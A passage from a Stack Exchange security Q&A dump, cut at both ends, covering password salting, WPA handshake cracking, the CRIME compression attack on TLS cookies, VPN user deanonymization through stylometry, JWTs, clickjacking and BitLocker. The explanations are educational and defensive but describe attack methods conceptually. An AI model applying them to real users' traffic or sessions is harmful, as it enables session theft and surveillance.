<p>The important role of the <code>$salt</code> in this setting comes into play if you have access to the database over a prolonged time and you can still normally work with the application from the outside. Without the <code>$salt</code> you could set the password of an account you control to a known value <code>$passwordKnown</code> and compare the hash to the password of an unknown password <code>$passwordSecret</code>. As <code>hash($pepper . $passwordKnown)==hash($pepper . $passwordSecret)</code> if and only if <code>$passwordKnown==$passwordSecret</code> you can compare an unknown password against any chosen value (as a technicality I assume collision resistance of the hash function). But with the salt you get <code>hash($pepper . $salt1 . $passwordKnown)==hash($pepper . $salt2 . $passwordSecret)</code> if and only if <code>$salt1 . $passwordKnown == $salt2 . $passwordSecret</code> and as <code>$salt1</code> and <code>$salt2</code> were randomly chosen for <code>$passwordKnown</code> and respectively <code>$passwordSecret</code> the salts will never be the same (assuming large enough random values like 256bit) and you can thus no longer compare password against each other.</p>
","3289"
"Four-way Handshake in WPA-Personal (WPA-PSK)","63730","","<p>Can someone explain to me in what consists the Four-way Handshake in WPA-Personal (WPA with Pre-Shared Key), which informations are being sent between AP and client, how is it possible to find the AP Pre-Shared Key from these informations after we capture the Four-way Handshake.</p>
","<p><a href=""http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/"">This book</a> is a very good resource on wireless security. <a href=""http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/Part+II+The+Design+of+Wi-Fi+Security/Chapter+10.+WPA+and+RSN+Key+Hierarchy/Details+of+Key+Derivation+for+WPA/"">This section</a> explains the details of the four-way handshake, but you really need to read the whole chapter to understand it.</p>

<p>Both WPA2-PSK and WPA2-EAP result in a Pairwise Master Key (PMK) known to both the supplicant (client) and the authenticator (AP). (In PSK the PMK is derived directly from the password, whereas in EAP it is a result of the authentication process.) The four-way WPA2 handshake essentially makes the supplicant and authenticator prove to each other that they both know the PMK, and creates the temporal keys used to actually secure network data.</p>

<p>Capturing the four-way handshake will not divulge the PMK or PSK (since capturing the handshake is trivial over wireless this would be a major vulnerability). The PMK isn't even sent during the handshake, instead it is used to calculate a Message Integrity Check (MIC). You basically need to perform a dictionary or bruteforce attack on the handshake until you find a password which results in the same MIC as in the packets.</p>
","17782"
"CRIME - How to beat the BEAST successor?","62983","","<p>With the advent of <a href=""https://threatpost.com/new-attack-uses-ssltls-information-leak-hijack-https-sessions-090512"">CRIME, BEAST's successor</a>, what possible protection is available for an individual and/or system owner in order to protect themselves and their users against this new attack on TLS?</p>
","<p>This attack is supposed to be presented 10 days from now, but my guess is that they use <strong>compression</strong>.</p>

<p><a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS</a> optionally supports data compression. In the <code>ClientHello</code> message, the client states the list of compression algorithms that it knows of, and the server responds, in the <code>ServerHello</code>, with the compression algorithm that will be used. Compression algorithms are specified by one-byte identifiers, and TLS 1.2 (RFC 5246) defines only the <code>null</code> compression method (i.e. no compression at all). Other documents specify compression methods, in particular <a href=""http://tools.ietf.org/html/rfc3749"">RFC 3749</a> which defines compression method 1, based on <a href=""http://tools.ietf.org/html/rfc1951"">DEFLATE</a>, the LZ77-derivative which is at the core of the GZip format and also modern Zip archives. When compression is used, it is applied on all the transferred data, as a long stream. In particular, when used with HTTPS, compression is applied on all the successive HTTP requests in the stream, header included. DEFLATE works by locating repeated subsequences of bytes.</p>

<p>Suppose that the attacker uses some JavaScript code which can send arbitrary requests to a target site (e.g. a bank) and runs on the attacked machine; the browser will send these requests with the user's cookie for that bank -- the cookie value that the attacker is after. Also, let's suppose that the attacker can observe the traffic between the user's machine and the bank (plausibly, the attacker has access to the same LAN of Wi-Fi hotspot than the victim; or he has hijacked a router somewhere on the path, possibly close to the bank server).</p>

<p>For this example, we suppose that the cookie in each HTTP request looks like this:</p>

<blockquote>
  <p>Cookie: secret=7xc89f+94/wa</p>
</blockquote>

<p>The attacker knows the <code>Cookie: secret=</code> part and wishes to obtain the secret value. So he instructs his JavaScript code to issue a request containing in the <em>body</em> the sequence <code>Cookie: secret=0</code>. The HTTP request will look like this:</p>

<pre><code>POST / HTTP/1.1
Host: thebankserver.com
(...)
Cookie: secret=7xc89f+94/wa
(...)

Cookie: secret=0
</code></pre>

<p>When DEFLATE sees that, it will recognize the repeated <code>Cookie: secret=</code> sequence and represent the second instance with a very short token (one which states ""previous sequence has length 15 and was located <em>n</em> bytes in the past); DEFLATE will have to emit an extra token for the '0'.</p>

<p>The request goes to the server. From the outside, the eavesdropping part of the attacker sees an opaque blob (SSL encrypts the data) but he can see the blob <em>length</em> (with byte granularity when the connection uses RC4; with block ciphers there is a bit of padding, but the attacker can adjust the contents of his requests so that he may phase with block boundaries, so, in practice, the attacker can know the length of the compressed request).</p>

<p>Now, the attacker tries again, with <code>Cookie: secret=1</code> in the request body. Then, <code>Cookie: secret=2</code>, and so on. All these requests will compress to the same size (almost -- there are subtleties with Huffman codes as used in DEFLATE), <strong>except</strong> the one which contains <code>Cookie: secret=7</code>, which compresses better (16 bytes of repeated subsequence instead of 15), and thus will be shorter. The attacker sees that. Therefore, in a few dozen requests, the attacker has guessed the first byte of the secret value.</p>

<p>He then just has to repeat the process (<code>Cookie: secret=70</code>, <code>Cookie: secret=71</code>, and so on) and obtain, byte by byte, the complete secret.</p>

<hr />

<p>What I describe above is what I thought of when I read the article, which talks about ""information leak"" from an ""optional feature"". I cannot know for sure that what will be published as the CRIME attack is really based upon compression. However, I do not see how the attack on compression cannot work. Therefore, regardless of whether CRIME turns out to abuse compression or be something completely different, you should turn off compression support from your client (or your server).</p>

<p>Note that I am talking about compression at the SSL level. HTTP <em>also</em> includes optional compression, but this one applies only to the <em>body</em> of the requests and responses, not the header, and thus does not cover the <code>Cookie:</code> header line. HTTP-level compression is fine.</p>

<p>(It is a shame to have to remove SSL compression, because it is very useful to lower bandwidth requirements, especially when a site contains many small pictures or is Ajax-heavy with many small requests, all beginning with extremely similar versions of a mammoth HTTP header. It would be better if the security model of JavaScript was fixed to prevent malicious code from sending arbitrary requests to a bank server; I am not sure it is easy, though.)</p>

<hr />

<p><strong>Edit 2012/09/12:</strong> The attack above can be optimized a bit by doing a dichotomy. Imagine that the secret value is in Base64, i.e. there are 64 possible values for each unknown character. The attacker can make a request containing 32 copies of <code>Cookie: secret=X</code> (for 32 variants of the <code>X</code> character). If one of them matches the actual cookie, the total compressed length with be shorter than otherwise. Once the attacker knows which half of his alphabet the unknown byte is part of, he can try again with a 16/16 split, and so on. In 6 requests, this homes in the unknown byte value (because 2<sup>6</sup> = 64). If the secret value is in hexadecimal, the 6 requests become 4 requests (2<sup>4</sup> = 16). Dichotomy explains <a href=""https://twitter.com/julianor/status/245943430570704896"">this recent twit of Juliano Rizzo</a>.</p>

<hr />

<p><strong>Edit 2012/09/13:</strong> <a href=""http://threatpost.com/crime-attack-uses-compression-ratio-tls-requests-side-channel-hijack-secure-sessions-091312/""><strong>IT IS CONFIRMED.</strong></a> The CRIME attack abuses compression, in a way similar to what is explained above. The actual ""body"" in which the attacker inserts presumed copies of the cookie can actually be the <em>path</em> in a simple request which can be triggered by a most basic <code>&lt;img&gt;</code> tag; no need for fancy exploits of the same-origin-policy.</p>
","19914"
"Is it possible to Identify a VPN user by finding relations in traffic?","62430","","<p>If I am using VPN service to protect my identity, can my traffic be used to identify all my traffic?</p>

<p>For example, if I am accessing two services:  </p>

<ol>
<li>Some service A, where I do not leave any identifying information.  </li>
<li>My personal E-Mail account.  </li>
</ol>

<p>Can someone find a relation between (1) and (2), such that he will be able to tell that both are accessed by the same person.</p>

<p>Naively I would think that it is impossible and someone would at most be able to tell that I am using VPN provider to access my E-Mails, without knowing about (1).  </p>

<p>But perhaps my computer, browser or something else leaves some kind of signature in the data, which would enable someone to find a relation?  </p>
","<p>This depends on whether you are worried about being convicted, or dealing with probable cause (in the U.S.).</p>

<p>Let's assume that you are at home.  You start up your VPN and connect to your offsite VPN provider.  If I am monitoring outgoing traffic (from your house), I know that you just connected to a certain IP address, and that the IP address is a VPN provider.  Everything inside the payload of the packet is encrypted.</p>

<p>You then decide while at home, to check your email.  I happen to be monitoring outgoing traffic from the VPN provider (which is not encrypted).  I record it all using snort, and run Wireshark against the output.  I see a connection to your email address and an email written.  This may be protected by SSL if it's webmail.  If it's regular email, it's likely plain text.  If it's not plain text, I can try to intercept it at the receiver.  The email is of no legal significance (i.e. you aren't using it to plan something unlawful).  However, I make note of the fact that you confuse the use of their, there, and they're.  I'll also notice a few idioms you like to use.</p>

<p>Over the course of monitoring outgoing traffic I see your account write several emails.  I note patterns of misspellings, and more figures of speech.  I collect these over a period of a month or two.</p>

<p>I then put the items that I notice into Wireshark.  I add several things that you are known to say.  Every time a misspelling occurs, or the use of an idiom (that you use) is found in the content of ANY packet that is outgoing from the VPN service you use, I view it.</p>

<p>Given another month or two I have a lot of data points.  Some are sites you went to, others are not.  The first thing I do is eliminate all of the data points that exited the VPN service provider while you were NOT on line (i.e. I didn't see you online from home, remember I started by monitoring that connection).</p>

<p>Then I look at the remaining traffic and see if I have any cluster points.  Lots of recurring themes.  Same subject matter over an over.  I compare that to your unencrypted traffic, and your email.</p>

<p>I haven't applied enough filters to isolate you from the noise (people that use the same idioms/spelling errors you do), but I would have a good case for probable cause.  If I have enough points of reference, it is just like a fingerprint.</p>

<p>Essentially I'm applying a Bayesian analysis to a corpus of work, to state something about the likelihood that I believe an exemplar to be a member of the set constructed by my suspect. The collection of works that I would compare to comes from any work that the suspect has publicly acknowledged they are responsible for.  That analysis is well-known (and there's a whole statistics StackExchange site, too). </p>

<p>I'll let you answer, what would I come up with at this point?</p>
","17860"
"How does hashing work?","62296","","<p>I have been interested in Information Security. I was recently introduced to the idea of hashing. What I currently understand about hashing is that it takes the password a user enters. Then it randomly generates a ""hash"" using a bunch of variables and scrambling everything. Then when you enter this password to log in it matches that password to the hash. There are just a couple of things I don't understand about it. </p>

<ol>
<li><p>Why is it so hard to crack these hashes? I would assume once you
found the method they are using to encrypt it (lets go with an
extremely simple one like Caesar's cipher once you find out how many
you have to shift over you can do it for whole books). Even if it
uses something like time and jumbles it there are some really big
ways you can limit the options (Lets use the Caesar cipher they're
using the year mod x you already know that there are two possible
years realistically then you just have to figure out the second
piece of the puzzle). </p></li>
<li><p>If they are generated randomly (even if two passwords are the
same they come out differently) how can they tell if it's correct?</p></li>
<li><p>How are they cracked. How does hash cat know when it has
successfully decrypt the password?</p></li>
</ol>

<p>Related video (but doesn't exactly answer my question): <a href=""https://www.youtube.com/watch?v=b4b8ktEV4Bg"">https://www.youtube.com/watch?v=b4b8ktEV4Bg</a></p>
","<p>Quick, factor 1081.</p>

<p>Or if you prefer, answer this: what's 23 times 47?</p>

<p>Which one is easier? It's easier to perform a multiplication (just follow the rules mechanically) than to recover the operands given only the product. Multiplication. (This, by the way, is the foundation of some cryptographic algorithms such as <a href=""http://en.wikipedia.org/wiki/RSA_(algorithm)"" rel=""noreferrer"">RSA</a>.)</p>

<p><strong><a href=""http://en.wikipedia.org/wiki/Cryptographic_hash_function"" rel=""noreferrer"">Cryptographic hash functions</a></strong> have different mathematical foundations, but they have the same property: they're easy to compute going forward (calculate H(x) given x), but practically impossible to compute going backward (given y, calculate x such that H(x) = y). In fact, one of the signs of a good cryptographic hash function is that there is no better way to find x than trying them all and computing H(x) until you find a match.</p>

<p>Another important property of hash functions is that two different inputs have different hashes. So if H(x<sub>1</sub>) = H(x<sub>2</sub>), we can conclude that x<sub>1</sub> = x<sub>2</sub>. Mathematically speaking, this is impossible — if the inputs are longer than the length of the hash, there have to be collisions. But with a good cryptographic hash function, there is no known way of finding a collision with all the computing resources in the world.</p>

<p>If you want to understand more about <a href=""https://security.stackexchange.com/questions/14025/why-is-using-salt-more-secure/14026#14026"">cryptographic hash</a> functions, read <a href=""https://security.stackexchange.com/questions/11717/why-are-hash-functions-one-way-if-i-know-the-algorithm-why-cant-i-calculate-t/19658#19658"">this answer by Thomas Pornin</a>. Go on, I'll wait.</p>

<p>Note that a hash function is not an encryption function. Encryption implies that you can decrypt (if you know the key). With a hash, there's no magical number that lets you go back.</p>

<p>The main recommended cryptographic hash functions are <a href=""http://en.wikipedia.org/wiki/SHA-1"" rel=""noreferrer"">SHA-1</a> and the <a href=""http://en.wikipedia.org/wiki/SHA-2"" rel=""noreferrer"">SHA-2</a> family (which comes in several output sizes, mainly SHA-256 and SHA-512). <a href=""http://en.wikipedia.org/wiki/MD5"" rel=""noreferrer"">MD5</a> is an older one, now deprecated because it has known collisions. Ultimately, there is no mathematical proof that they are indeed good cryptographic hash functions, only a widespread belief because many professional cryptographers have spent years of their life trying, and failing, to break them.</p>

<p>Ok, that's one part of the story. Now a <strong>password hash</strong> is not directly a cryptographic hash function. A password hash function (PHF) takes two inputs: the password, and a salt. The <strong>salt</strong> is randomly generated when the user picks his password, and it is stored together with the hashed password PHF(password, salt).  (What matters is that two different accounts always have different salts, and randomly generating a sufficiently large salt is a good way to have this property with overwhelming probability.) When the user logs in again, the verification system reads the salt from the password database, computes PHF(password, salt), and verifies that the result is what is stored in the database.</p>

<p>The point of the salt is that if someone wants to crack a password, <a href=""https://security.stackexchange.com/questions/14025/why-is-using-salt-more-secure/14026#14026"">they'll have to know the hash before they can start</a>, and they have to attack each account separately. The salt makes it impossible to perform a lot of cracking work in advance, e.g. by generating a <a href=""https://security.stackexchange.com/questions/379/what-are-rainbow-tables-and-how-are-they-used"">rainbow table</a>.</p>

<p>This answers (2) and (3) — the legitimate verifier and the attacker find out in the same way whether the password (entered by the user, or guessed by the attacker) is correct. A final point in the story: a good password hash function has an additional property, it must be slow. The legitimate server only needs to compute it once per login attempt, whereas an attacker has to compute it once per guess, so the slowness hurts the attacker more (which is necessary, because the attacker typically has more, specialized hardware).</p>

<p>If you ever need to hash passwords, <a href=""https://security.meta.stackexchange.com/questions/880/the-memes-of-it-security/915#915"">don't invent your own method</a>. <a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords/31846#31846"">Use one of the standard methods</a>: <a href=""http://en.wikipedia.org/wiki/Scrypt"" rel=""noreferrer"">scrypt</a>, <a href=""http://en.wikipedia.org/wiki/Bcrypt"" rel=""noreferrer"">bcrypt</a> or <a href=""http://en.wikipedia.org/wiki/PBKDF2"" rel=""noreferrer"">PBKDF2</a>.&nbsp;</p>
","33862"
"SSL with GET and POST","62140","","<p>I'm pretty new to security, so forgive my basic question, but does SSL encrypt POST requests but not GET requests?</p>

<p>For instance, if I have two requests</p>

<p>GET:
www.mycoolsite.com/index?id=1&amp;type=xyz</p>

<p>POST</p>

<p>site: www.mycoolsite.com/index
{
Params: id=1&amp;type=xyz
}</p>

<p>Is it safe to assume that someone is able to intercept the whole GET request (reading id and type), but if they intercept the POST they will be able to see the site path, but because it is going over SSL, they cannot see the params of id and type?</p>
","<p>Now, the question is, do you know what a HTTP request <em>looks like</em>?</p>

<p>Well, assuming not, here's an example of one:</p>

<pre><code>GET /test?param1=hello&amp;param2=world HTTP/1.1
Host: subdomain.test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1
Accept: image/png,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
</code></pre>

<p><em>All</em> of this information is enscapulated within the SSL transport - as the comment on your answer kindly says. This means:</p>

<ul>
<li>Get parameters are encrypted.</li>
<li>HTTP Body (post parameters) are encrypted.</li>
</ul>

<p>What's not necessarily secure:</p>

<ul>
<li>The host you're asking for. Most web servers these days support <code>Host: something</code> parameters so multiple domains can be handled by one web server on one interface and IP address. Clearly, this header <strong>is</strong> encrypted, however, if you run non-https traffic to the site it should be clear which hosts you might connect to. Even if that's not the case, reverse DNS will certainly tell you what's hosted on that IP and you can probably make a reasonable guess from there.</li>
<li>Your browser/client information. Unfortunately each https client is different and its negotiation process might potentially give away what platform it runs on, or what browser it is. This is not the end of the world by any means, it's just a fact to understand.</li>
</ul>

<p>POST requests look similar to get requests, except they contain a body. This may look like this:</p>

<pre><code>POST /testpost HTTP/1.1
Host: subdomain.test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1
Accept: image/png,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive

param1=hello&amp;param2=hello
</code></pre>

<p>There are some more complicated variants, of course, but essentially it is all encrypted anyway.</p>
","12533"
"JSON Web Tokens (JWT) as user identification and authentication tokens","62130","","<p>I'm implementing a REST service that requires authentication. I cannot store any per-user state (such as a randomly-generated token) because my service does not have direct access to a database, only to another backend service.</p>

<p>The solution I came up with is creating a JSON Web Token (<a href=""//self-issued.info/docs/draft-ietf-oauth-json-web-token.html"">JWT</a>) when the user authenticates. The JWT claims set contains the user ID in the Subject (""sub"") field. The server then encrypts the claims set directly (""alg"":""dir"") using AES GCM with 256 bit key (""enc"":""A256GCM"") creating a <a href=""//tools.ietf.org/html/draft-ietf-jose-json-web-encryption"">JWE</a>. The key is generated once when the service starts and stored in memory.</p>

<p>To authenticate, the client submits the username/password, and the server responds with the token described above. The client then sends that token with each subsequent request.</p>

<p>When the client submits the token with subsequent requests, the server decrypts it using the key, and <strong>assumes the user ID in the ""sub"" field to be the ID of the current user, without any further authentication checks.</strong> Token expiration is handled by the ""exp"" field in the JWT claims set.</p>

<p>The connection between the client and the server will use SSL/TLS, so the token will not leak.</p>

<p>I'm using <a href=""//bitbucket.org/nimbusds/nimbus-jose-jwt"">this library</a> to create and read JWTs as I don't trust myself to write correct cryptography code.</p>

<p>My questions:</p>

<ol>
<li>Is the above approach secure? Can an attacker impersonate another user by manipulating the token?</li>
<li>Is the approach over-complicated? Would using MAC (in other words: <a href=""//tools.ietf.org/html/draft-ietf-jose-json-web-signature"">JWS</a>) instead of encryption have the same security? (or possibly more, since it's simpler and there's less chance of making a mistake). There's nothing particularly secret in the JWT claims set, and the user knowing their own ID doesn't matter.</li>
<li>Is my choice of JWE algorithm and encryption appropriate?
<ul>
<li>For the JWE ""alg"", the library I'm using supports direct encryption (using the key directly to encrypt the claims set) and RSA (generating a new key to encrypt the claims set for each token, and encrypting the generated key with an RSA public key). I chose the former because it's easier to generate a symmetric key than an RSA key.</li>
<li>For the JWE ""enc"", the library supports AES GCM and AES CBC HMAC SHA2 (with various bit lengths). I chose GCM arbitrarily.</li>
</ul></li>
</ol>
","<p>Your basic approach is valid: generate the JWT when the user logs in, expect subsequent messages to carry the JWT, trust the subject field in the JWT in those subsequent messages if the JWT is valid. But there are several things you should be aware of:</p>

<ol>
<li>As Daisetsu say, you could use a MAC (""alg"":""HS256"") as MACs are specifically designed to prevent alteration of the payload, while encryption algorithms <em>typically</em> (counter-intuitively) are not. However since you're specifically using AES in <strong>GCM</strong> mode, you already get tamper-resistant encryption (""authenticated encryption""), so that's not really a concern.</li>
<li>When validating an incoming JWT, be careful what you consider valid. For example, I could call your service with {""sub"":""me"",""alg"":""none""} and while that JWT is valid in some sense, it isn't something you want to accept.</li>
<li>Since JWT is a draft, not a standard yet, it might change. If it changes enough, the library you're using might have to change in ways that break compatibility with your code.</li>
<li>If you can't store any server-side state, you have no way to invalidate the JWT when the user logs out. In effect your service has no logout function, which may be a security problem especially if you set the expiration time too far in the future.</li>
<li>If you set the expiration time too soon, you may have a problem with users still being logged in but not having a valid JWT. This may lead to awkward error-handling and user workflow issues.</li>
</ol>

<p>Since you said your server has no access to a database, I assume the actual login is handled somewhere else, perhaps the backend server you mentioned. You didn't say how your server knows that the user just logged in. Depending on user perception of the relationship between your service and the thing they know they logged into, the last two points above might be moot.</p>
","51370"
"How do I get the RSA bit length with the pubkey and openssl?","61948","","<p>I have a public key generated with <code>ssh-keygen</code> and I'm just wondering how I get information on the keylength with openssl?</p>
","<p>With <code>openssl</code>, if your private key is in file <code>id_rsa</code>, then:</p>

<pre><code>openssl rsa -text -noout -in id_rsa
</code></pre>

<p>will print the private key contents, and the first line of output contains the modulus size in bits. If the key is protected by a passphrase you will have to type that passphrase, of course.</p>

<p>If you only have the public key, then OpenSSL won't help directly. @Enigma shows the proper command line (with <code>ssh-keygen -lf id_rsa.pub</code>). You can still do that with OpenSSL the following way:</p>

<p>Open the public key file with a text editor. You will find something like this:</p>

<pre><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDo2xko99piegEDgZCrobfFTvXUTFDbWT
ch4IGk5mk0CelB5RKiCvDeK4yhDLcj8QNumaReuwNKGjAQwdENsIT1UjOdVvZOX2d41/p6J
gOCD1ujjwuHWBzzQvDA5rXdQgsdsrJIfNuYr/+kIIANkGPPIheb2Ar2ccIWh9giwNHDjkXT
JXTVQ5Whc0mGBU/EGdlCD6poG4EzCc0N9zk/DNSMIIZUInySaHhn2f7kmfoh5LRw7RF3c2O
5tCWIptu8u8ydIxz9q5zHxxKS+c7q4nkl9V/tVjZx8sneNZB+O79X1teq7LawiYJyLulUMi
OEoiL1YH1SE1U93bUcOWvpAQ5 thebear@isgreat.com
</code></pre>

<p>With your mouse, select the first characters of the middle blob (<em>after</em> the <code>ssh-rsa</code>); this is <a href=""http://en.wikipedia.org/wiki/Base64"">Base64</a> and OpenSSL can decode that:</p>

<pre><code>echo ""AAAAB3NzaC1yc2EAAAADAQABAAABAQDDo2xko99piegEDgZC"" | openssl base64 -d | hd
</code></pre>

<p>OpenSSL is picky, he will <em>require</em> that you input no more than 76 characters as one line, and the number of characters must be a multiple of 4. The line above will print out this:</p>

<pre><code>00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 03 01  |....ssh-rsa.....|
00000010  00 01 00 00 01 01 00 c3  a3 6c 64 a3 df 69 89 e8  |.........ld..i..|
00000020  04 0e 06 42                                       |...B|
</code></pre>

<p>This reads as such:</p>

<pre><code>00 00 00 07             The length in bytes of the next field
73 73 68 2d 72 73 61    The key type (ASCII encoding of ""ssh-rsa"")
00 00 00 03             The length in bytes of the public exponent
01 00 01                The public exponent (usually 65537, as here)
00 00 01 01             The length in bytes of the modulus (here, 257)
00 c3 a3...             The modulus
</code></pre>

<p>So the key has type RSA, and its modulus has length 257 <em>bytes</em>, except that the first byte has value ""00"", so the real length is 256 bytes (that first byte was added so that the value is considered positive, because the internal encoding rules call for <em>signed</em> integers, the first bit defining the sign). 256 bytes is 2048 bits.</p>
","42272"
"Why do browsers enforce the same-origin security policy on iframes?","61877","","<p>I did a small test on Chrome (V37) today. I created a small page and loaded it to the browser:</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Untitled Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;p&gt;Normal page&lt;/p&gt;
    &lt;iframe src=""https://security.stackexchange.com/"" /&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>Inspecting the console I found this error message:</p>

<blockquote>
  <p>Refused to display '<a href=""https://security.stackexchange.com/"">https://security.stackexchange.com/</a>' in a frame because it set 'X-Frame-Options' to 'SAMEORIGIN'.</p>
</blockquote>

<p>Why do browsers need to enforce same-origin policy on <code>iframe</code>s?</p>
","<h1>Review: Same-origin policy</h1>

<p>First, let's clarify that the behavior observed here (the iframe does not render) is <em>much stricter</em> than the default same-origin policy. If you already understand that, skip down to ""<em>What's actually happening</em>,"" below.</p>

<p>To review, the same-origin policy prevents <em>scripts</em> from having programmatic access to the contents of cross-origin resources. Consider how the same-origin policy applies to various types of resources:</p>

<ul>
<li><strong>Images:</strong> An <code>&lt;img&gt;</code> tag will show a cross-origin image to a user visually, but it will not allow a script to read the image content when loaded into a <code>&lt;canvas&gt;</code> (i.e., <code>toDataURL</code> will fail if the canvas contains any cross-origin images)</li>
<li><strong>Scripts:</strong> Cross-origin scripts will run when referenced in a <code>&lt;script&gt;</code> element, but the page can only <em>run</em> the script, not <em>read</em> its contents.</li>
<li><strong>Iframe:</strong> Like images, the contents of a framed cross-origin page appear visually to the user, but scripts in the outer framing page are not allowed access to the framed page's contents.</li>
</ul>

<p>The same-origin policy applies to iframes for the same reason it applies to all other types of resources: the web page being framed (or the image being displayed, or the resource being accessed via Ajax) is fetched using credentials from the resource's own origin (e.g., the HTTP request to fetch a resource from <code>google.com</code> includes my browser's cookies set for <code>google.com</code>). The page that issued the request should not be given read-access to a resource fetched with credentials from a different origin.</p>

<h1>What's actually happening: X-Frame-Options</h1>

<p>However, the behavior you see here is stricter than the same-origin policy: the framed page is not shown <em>at all</em>. The cross-origin server that hosts the (would-be) framed page requests this blocking behavior by sending an <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options""><strong><code>X-Frame-Options</code></strong> response header</a>, which specifies how the page is allowed to be framed.</p>

<blockquote>
  <ul>
  <li><strong>DENY</strong> The page cannot be displayed in a frame, regardless of the site attempting to do so.</li>
  <li><strong>SAMEORIGIN</strong> The page can only be displayed in a frame on the same origin as the page itself.</li>
  <li><strong>ALLOW-FROM <em>uri</em></strong> The page can only be displayed in a frame on the specified origin.</li>
  </ul>
</blockquote>

<p>Here, the site sends <code>X-Frame-Options: SAMEORIGIN</code>, which means the site can only be framed by pages with the same origin as the framed page.</p>

<p>From a security standpoint, this is done to prevent <a href=""https://www.owasp.org/index.php/Clickjacking"">clickjacking</a> (also called a ""UI redress"" attack). In a clickjacking attack, the page displays a click-activated component of another site inside an <code>&lt;iframe&gt;</code> and tricks the user into clicking it (usually by layering the the target component on top of an apparently-clickable feature of the framing site).</p>

<p>For a trivial example, a site might position a transparent <code>&lt;iframe&gt;</code> of <code>http://security.stackexchange.com</code> so that the ""log out"" link in the framed site was directly over top of a ""Click here to claim your free money"" button. When viewing the framing page, the user attempts to claim the free money, and suddenly finds himself logged out of Stack Exchange. When <code>http://security.stackexchange.com</code> sends an <code>X-Frame-Options: SAMEORIGIN</code> header, the malicious cross-origin page gets only an empty <code>&lt;iframe&gt;</code> instead; the user doesn't unwittingly click a log-out link because no content from the framed site made it onto the rendered page.</p>

<p>OWASP has a page detailing <a href=""https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet"">defenses against clickjacking</a>.</p>
","67917"
"What is the difference between serial number and thumbprint?","61787","","<p>I have problems to understand what is the difference between the serial number of a certificate and its SHA1 hash. </p>

<p>The MSDN says: </p>

<blockquote>
  <p><strong>Serial number</strong>   A number that uniquely identifies the certificate and
  is issued by the certification authority.</p>
</blockquote>

<p>So can I identify a certificate by its serial number, right? </p>

<p>Wikipedia says for the hash:</p>

<blockquote>
  <p><strong>Thumbprint:</strong> The hash itself, used as an abbreviated form of the public
  key certificate.</p>
</blockquote>

<p>So the hash identifies the (e.g. RSA) key.</p>

<p>I currently do some research on Android app certificates and I found some interesting certificates:</p>

<pre><code>[Issuer][Serial][SHA1 Hash][Valid From]
[C=US, L=Mountain View, S=California, O=Android, OU=Android, CN=Android, E=android@android.com][00936EACBE07F201DF][BB84DE3EC423DDDE90C08AB3C5A828692089493C][Sun, 29 Feb 2008 01:33:46 GMT]
[C=US, L=Mountain View, S=California, O=Android, OU=Android, CN=Android, E=android@android.com][00936EACBE07F201DF][6B44B6CC0B66A28AE444DA37E3DFC1E70A462EFA][Sun, 29 Feb 2008 01:33:46 GMT]
[C=US, L=Mountain View, S=California, O=Android, OU=Android, CN=Android, E=android@android.com][00936EACBE07F201DF][0B4BE1DB3AB39C9C3E861AEC1348110062D3BC1B][Sun, 29 
</code></pre>

<p>And there are a lot more which share the same serial, but have different hashes.</p>

<p>So there can be a certificate with different key? Who is actually creating the serial number when creating a certificate for an Android app? For the hash it is clear, but can I create a new certificate with the same serial number as another cert?</p>

<p>Can I be sure that a certificate with the same serial number was created by the same person?</p>
","<p>In a <a href=""http://en.wikipedia.org/wiki/X.509"">certificate</a>, the <strong>serial number</strong> is chosen by the CA which issued the certificate. It is just written in the certificate. The CA can choose the serial number in any way as it sees fit, not necessarily randomly (and it has to fit in 20 bytes). A CA is <em>supposed</em> to choose unique serial numbers, that is, unique <em>for the CA</em>. You cannot count on a serial number being unique worldwide; in the dream world of X.509, it is the pair issuerDN+serial which is unique worldwide (each CA having its own unique distinguished name, and taking care not to reuse serial numbers).</p>

<p>The <strong>thumbprint</strong> is a hash value computed over the complete certificate, which includes all its fields, including the signature. That one <em>is</em> unique worldwide, for a given certificate, up to the inherent collision resistance of the used hash function. Microsoft software tends to use SHA-1, for which some theoretical weaknesses are known, but no actual collision has been produced (yet).</p>

<p>(The thumbprints you show appear to consist of 40 hexadecimal characters, i.e. 160 bits, which again points at SHA-1 as the plausibly used hash function.)</p>
","35694"
"Bitlocker without TPM with both a startup USB and password?","61765","","<p>On a Windows 8.1 Pro PC without TPM, how can I use Bitlocker with both a startup USB drive and password?</p>

<p>I don't have the option to use both of them, is this possible via command line?</p>

<p><img src=""https://i.stack.imgur.com/Ms47I.png"" alt=""Screenshot""></p>

<p>Currently, using Bitlocker with TPM and a startup USB and password is possible, so it should be possible with a startup USB drive and password but no TPM.</p>
","<p><a href=""http://www.eightforums.com/tutorials/21271-bitlocker-turn-off-os-drive-windows-8-a.html"" rel=""nofollow noreferrer"">This guide</a> explains it quite well, although consider following the steps below rather than downloading and running .reg files from the internet. </p>

<p>One can turn on Bitlocker without TPM but has to modify the registry in order to allow this, as this isn't what Microsoft originally planned as the drive won't be bound to the computer any longer. For company's convenience this option was added but hidden.</p>

<p>Steps:</p>

<ol>
<li>Open the group policy editor (gpedit.msc) as admin.</li>
<li>Go into the ""directoy"" (left sub-window) ""Computer Configuration/Administrative Templates/ Windows Components/ BitLocker Drive Encryption/ Operating System Drives""</li>
<li>Open the ""Require additional authentification at startup"" entry (right sub-window)</li>
<li>Set the radio box to ""enabled"" and check ""Allow Bitlocker without a compatible TPM""</li>
